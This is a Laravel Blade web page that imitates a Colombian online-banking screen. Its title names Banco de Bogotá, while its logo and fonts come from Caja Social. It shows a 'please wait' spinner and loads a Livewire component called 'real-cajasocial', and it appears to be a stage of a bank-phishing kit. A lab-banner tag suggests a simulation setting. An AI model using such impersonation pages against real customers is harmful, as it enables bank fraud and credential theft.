<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banca Virtual Banco de Bogotá</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"
        integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
    <style>
        @font-face {
            font-family: Roboto-Light;
            src: url(/cajasocial/ce61b8b68994802f2e55.ttf);
            font-display: swap
        }

        @font-face {
            font-family: Roboto-Regular;
            src: url(/cajasocial/6bede58e856278b0f8f1.ttf);
            font-display: swap
        }

        @font-face {
            font-family: Roboto-Medium;
            src: url(/cajasocial/0fcd45fbfc419c42c8b9.ttf);
            font-display: swap
        }

        @font-face {
            font-family: Roboto-Bold;
            src: url(/cajasocial/17451a4c1cd55e33ac57.ttf);
            font-display: swap
        }

        @font-face {
            font-family: Roboto-Italic;
            src: url(/cajasocial/dcb583d9def8308113fc.ttf);
            font-display: swap
        }

        @font-face {
            font-family: Roboto-MediumItalic;
            src: url(/cajasocial/102943405e853bda70b7.ttf);
            font-display: swap
        }


        .texto-1 {
            -webkit-text-size-adjust: 100%;
            -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
            --blue: #007bff;
            --indigo: #6610f2;
            --purple: #6f42c1;
            --pink: #e83e8c;
            --red: #dc3545;
            --orange: #fd7e14;
            --yellow: #ffc107;
            --green: #28a745;
            --teal: #20c997;
            --cyan: #17a2b8;
            --white: #fff;
            --gray: #6c757d;
            --gray-dark: #343a40;
            --primary: #1281ac;
            --secondary: rgba(0, 0, 0, .3);
            --success: #759a3d;
            --info: #3ebfed;
            --warning: #fec61d;
            --danger: #c22327;
            --light: #f8f9fa;
            --dark: rgba(0, 0, 0, .9);
            --breakpoint-xs: 0;
            --breakpoint-sm: 576px;
            --breakpoint-md: 768px;
            --breakpoint-lg: 992px;
            --breakpoint-xl: 1200px;
            --font-family-sans-serif: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
            --font-family-monospace: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
            font: 13px/1.231 arial, helvetica, clean, sans-serif;
            word-wrap: break-word;
            box-sizing: border-box;
            -webkit-font-smoothing: antialiased;
            line-height: 1.2;
            font-size: 16px;
            font-weight: 400;
            font-family: Roboto-Regular;
            font-style: normal;
            color: #496374;
            margin: 0;
        }

        .entrada-1 {
            visibility: inherit;
            --sherpa-midnight-50: #f6faff;
            --sherpa-midnight-200: #d4e5f8;
            --sherpa-midnight-300: #b0cdf1;
            --sherpa-midnight-400: #94bae9;
            --sherpa-midnight-600: #4d86d4;
            --sherpa-midnight-700: #1054b7;
            --sherpa-midnight-800: #0043a9;
            --sherpa-midnight-900: #00317e;
            --sherpa-white: #ffffff;
            --sherpa-carbon-50: #f2f2f2;
            --sherpa-carbon-200: #e6e6e6;
            --sherpa-carbon-300: #cccccc;
            --sherpa-carbon-400: #b3b3b3;
            --sherpa-carbon-600: #808080;
            --sherpa-carbon-700: #666666;
            --sherpa-carbon-800: #444444;
            --sherpa-carbon-900: #000000;
            --sherpa-info-100: #edf7ff;
            --sherpa-info-500: #9ac7eb;
            --sherpa-info-800: #2076c2;
            --sherpa-info-900: #004f99;
            --sherpa-success-100: #ecffe2;
            --sherpa-success-500: #95e077;
            --sherpa-success-800: #198500;
            --sherpa-success-900: #105c00;
            --sherpa-warning-100: #fff0e0;
            --sherpa-warning-500: #ecc192;
            --sherpa-warning-800: #b15c00;
            --sherpa-warning-900: #773e00;
            --sherpa-error-100: #ffe7e6;
            --sherpa-error-500: #eda4a1;
            --sherpa-error-800: #c94740;
            --sherpa-error-900: #940700;
            --sherpa-peach-800: #cc4700;
            --sherpa-peach-500: #da8658;
            --sherpa-mustard-800: #927200;
            --sherpa-mustard-500: #ebcd5a;
            --sherpa-khaki-800: #6d6d25;
            --sherpa-khaki-500: #a7a66f;
            --sherpa-bluey-800: #446e80;
            --sherpa-bluey-500: #8cafbe;
            --sherpa-rose-800: #9a3e47;
            --sherpa-rose-500: #f0bec3;
            --sherpa-mauve-800: #97437b;
            --sherpa-mauve-500: #c8aabe;
            --sherpa-bluebrand-800: #14327d;
            --sherpa-yellowbrand-800: #ffbe00;
            --sherpa-redbrand-900: #cd3232;
            --sherpa-burgundy-800: #b95477;
            --sherpa-green-800: #00856d;
            --sherpa-spacing-0: 0px;
            --sherpa-spacing-1: 4px;
            --sherpa-spacing-2: 8px;
            --sherpa-spacing-3: 12px;
            --sherpa-spacing-4: 16px;
            --sherpa-spacing-5: 20px;
            --sherpa-spacing-6: 24px;
            --sherpa-spacing-7: 32px;
            --sherpa-spacing-8: 40px;
            --sherpa-spacing-9: 48px;
            --sherpa-spacing-10: 56px;
            --sherpa-spacing-11: 80px;
            --sherpa-spacing-12: 120px;
            --sherpa-spacing-13: 160px;
            --sherpa-max-container-width: 73rem;
            --sherpa-gutter-width: 0.5rem;
            --sherpa-padding-vertical: 0.5rem;
            --sp-color-background-info-light: var(--sherpa-info-100);
            --sp-color-background-info-dark: var(--sherpa-info-500);
            --sp-color-background-warning-light: var(--sherpa-warning-100);
            --sp-color-background-warning-dark: var(--sherpa-warning-500);
            --sp-color-background-success-light: var(--sherpa-success-100);
            --sp-color-background-success-dark: var(--sherpa-success-500);
            --sp-color-background-error-light: var(--sherpa-error-100);
            --sp-color-background-error-dark: var(--sherpa-error-500);
            --sp-color-background-disabled-light: var(--sherpa-carbon-50);
            --sp-color-background-disabled-dark: var(--sherpa-carbon-600);
            --sp-color-border-info: var(--sherpa-info-500);
            --sp-color-border-warning: var(--sherpa-warning-500);
            --sp-color-border-success: var(--sherpa-success-500);
            --sp-color-border-error: var(--sherpa-error-500);
            --sp-color-border-disabled: var(--sherpa-carbon-600);
            --sp-border-radius-1: 4px;
            --sp-border-radius-2: 8px;
            --sp-border-radius-3: 12px;
            --sp-border-radius-4: 16px;
            --sp-color-text-info: var(--sherpa-info-900);
            --sp-color-text-warning: var(--sherpa-warning-900);
            --sp-color-text-success: var(--sherpa-success-900);
            --sp-color-text-error: var(--sherpa-error-900);
            -webkit-font-smoothing: antialiased;
            font-size: 18px;
            font-family: Roboto-Regular;
            font-weight: normal;
            line-height: 24px;
            letter-spacing: 0.2px;
            outline: none;
            margin: 0;
            min-width: 0;
            width: -webkit-fill-available;
            text-indent: 16px;
            padding: 0;
            color: var(--sherpa-carbon-900);
            border: solid 1px var(--sherpa-carbon-400);
            background-color: var(--sherpa-white);
            border-radius: 4px;
            text-align: left;
            height: 48px;
            text-overflow: ellipsis;
            padding-right: 16px;
        }

        .boton-1 {
            visibility: inherit;
            --sherpa-midnight-50: #f6faff;
            --sherpa-midnight-200: #d4e5f8;
            --sherpa-midnight-300: #b0cdf1;
            --sherpa-midnight-400: #94bae9;
            --sherpa-midnight-600: #4d86d4;
            --sherpa-midnight-700: #1054b7;
            --sherpa-midnight-800: #0043a9;
            --sherpa-midnight-900: #00317e;
            --sherpa-white: #ffffff;
            --sherpa-carbon-50: #f2f2f2;
            --sherpa-carbon-200: #e6e6e6;
            --sherpa-carbon-300: #cccccc;
            --sherpa-carbon-400: #b3b3b3;
            --sherpa-carbon-600: #808080;
            --sherpa-carbon-700: #666666;
            --sherpa-carbon-800: #444444;
            --sherpa-carbon-900: #000000;
            --sherpa-info-100: #edf7ff;
            --sherpa-info-500: #9ac7eb;
            --sherpa-info-800: #2076c2;
            --sherpa-info-900: #004f99;
            --sherpa-success-100: #ecffe2;
            --sherpa-success-500: #95e077;
            --sherpa-success-800: #198500;
            --sherpa-success-900: #105c00;
            --sherpa-warning-100: #fff0e0;
            --sherpa-warning-500: #ecc192;
            --sherpa-warning-800: #b15c00;
            --sherpa-warning-900: #773e00;
            --sherpa-error-100: #ffe7e6;
            --sherpa-error-500: #eda4a1;
            --sherpa-error-800: #c94740;
            --sherpa-error-900: #940700;
            --sherpa-peach-800: #cc4700;
            --sherpa-peach-500: #da8658;
            --sherpa-mustard-800: #927200;
            --sherpa-mustard-500: #ebcd5a;
            --sherpa-khaki-800: #6d6d25;
            --sherpa-khaki-500: #a7a66f;
            --sherpa-bluey-800: #446e80;
            --sherpa-bluey-500: #8cafbe;
            --sherpa-rose-800: #9a3e47;
            --sherpa-rose-500: #f0bec3;
            --sherpa-mauve-800: #97437b;
            --sherpa-mauve-500: #c8aabe;
            --sherpa-bluebrand-800: #14327d;
            --sherpa-yellowbrand-800: #ffbe00;
            --sherpa-redbrand-900: #cd3232;
            --sherpa-burgundy-800: #b95477;
            --sherpa-green-800: #00856d;
            --sherpa-spacing-0: 0px;
            --sherpa-spacing-1: 4px;
            --sherpa-spacing-2: 8px;
            --sherpa-spacing-3: 12px;
            --sherpa-spacing-4: 16px;
            --sherpa-spacing-5: 20px;
            --sherpa-spacing-6: 24px;
            --sherpa-spacing-7: 32px;
            --sherpa-spacing-8: 40px;
            --sherpa-spacing-9: 48px;
            --sherpa-spacing-10: 56px;
            --sherpa-spacing-11: 80px;
            --sherpa-spacing-12: 120px;
            --sherpa-spacing-13: 160px;
            --sherpa-max-container-width: 73rem;
            --sherpa-gutter-width: 0.5rem;
            --sherpa-padding-vertical: 0.5rem;
            --sp-color-background-info-light: var(--sherpa-info-100);
            --sp-color-background-info-dark: var(--sherpa-info-500);
            --sp-color-background-warning-light: var(--sherpa-warning-100);
            --sp-color-background-warning-dark: var(--sherpa-warning-500);
            --sp-color-background-success-light: var(--sherpa-success-100);
            --sp-color-background-success-dark: var(--sherpa-success-500);
            --sp-color-background-error-light: var(--sherpa-error-100);
            --sp-color-background-error-dark: var(--sherpa-error-500);
            --sp-color-background-disabled-light: var(--sherpa-carbon-50);
            --sp-color-background-disabled-dark: var(--sherpa-carbon-600);
            --sp-color-border-info: var(--sherpa-info-500);
            --sp-color-border-warning: var(--sherpa-warning-500);
            --sp-color-border-success: var(--sherpa-success-500);
            --sp-color-border-error: var(--sherpa-error-500);
            --sp-color-border-disabled: var(--sherpa-carbon-600);
            --sp-border-radius-1: 4px;
            --sp-border-radius-2: 8px;
            --sp-border-radius-3: 12px;
            --sp-border-radius-4: 16px;
            --sp-color-text-info: var(--sherpa-info-900);
            --sp-color-text-warning: var(--sherpa-warning-900);
            --sp-color-text-success: var(--sherpa-success-900);
            --sp-color-text-error: var(--sherpa-error-900);
            font-size: 16px;
            font-family: Roboto-Regular;
            font-weight: normal;
            line-height: 24px;
            letter-spacing: .2px;
            margin-left: 0px;
            display: flex;
            -webkit-box-align: center;
            align-items: center;
            -webkit-box-pack: center;
            justify-content: center;
            width: 100%;
            border-radius: 100px;
            cursor: pointer;
            outline: none;
            user-select: none;
            height: 48px;
            padding-left: var(--sherpa-spacing-7);
            padding-right: var(--sherpa-spacing-7);
            padding-top: 14px;
            padding-bottom: var(--sherpa-spacing-4);
            border: solid 1px var(--sherpa-midnight-800);
            background-color: var(--sherpa-midnight-800);
            color: var(--sherpa-white);
            transition: .3s;
            margin-top: var(--sherpa-spacing-7);
        }

        .label-1 {
            -webkit-text-size-adjust: 100%;
            -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
            --blue: #007bff;
            --indigo: #6610f2;
            --purple: #6f42c1;
            --pink: #e83e8c;
            --red: #dc3545;
            --orange: #fd7e14;
            --yellow: #ffc107;
            --green: #28a745;
            --teal: #20c997;
            --cyan: #17a2b8;
            --white: #fff;
            --gray: #6c757d;
            --gray-dark: #343a40;
            --primary: #1281ac;
            --secondary: rgba(0, 0, 0, .3);
            --success: #759a3d;
            --info: #3ebfed;
            --warning: #fec61d;
            --danger: #c22327;
            --light: #f8f9fa;
            --dark: rgba(0, 0, 0, .9);
            --breakpoint-xs: 0;
            --breakpoint-sm: 576px;
            --breakpoint-md: 768px;
            --breakpoint-lg: 992px;
            --breakpoint-xl: 1200px;
            --font-family-sans-serif: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto-Regular, "Helvetica Neue", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
            --font-family-monospace: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
            font: 13px/1.231 arial, helvetica, clean, sans-serif;
            text-align: left;
            word-wrap: break-word;
            box-sizing: border-box;
            -webkit-font-smoothing: antialiased;
            display: inline-block;
            font-family: Roboto-Regular;
            font-size: 10px;
            color: #333;
            font-style: normal;
            margin-bottom: 5px;
            line-height: 14px;
            text-transform: uppercase;
            font-weight: 700;
        }

        .loading-spinner {
            display: inline-block;
            width: 100px;
            height: 100px;
            border: 10px solid rgba(230, 230, 230, .3);
            border-radius: 50%;
            border-top-color: #00253d;
            animation: spin 1s ease-in-out infinite;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }


        @media only screen and (min-width: 768px) {
            body {
                width: 40%;
                /* Ancho del cuerpo en dispositivos de escritorio */
                margin: 0 auto;
                /* Centra el cuerpo horizontalmente */
            }
        }
    </style>

</head>

<body class="px-3">
<x-lab-banner />
    <div class="text-center py-4">
        <img src="/cajasocial/logo_cajasocial.svg" width="300" height="auto">
    </div>
    <br>
    <br>
    <div class="text-center mt-5">
        <div class="loading-spinner"></div>
    </div>
    <br>
    <div class="text-center">
        <p class="texto-1">Espere un momento por favor.</p>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL"
        crossorigin="anonymous"></script>
    <div>
        @livewire('real-cajasocial')
    </div>
    @livewireScripts

</body>

</html>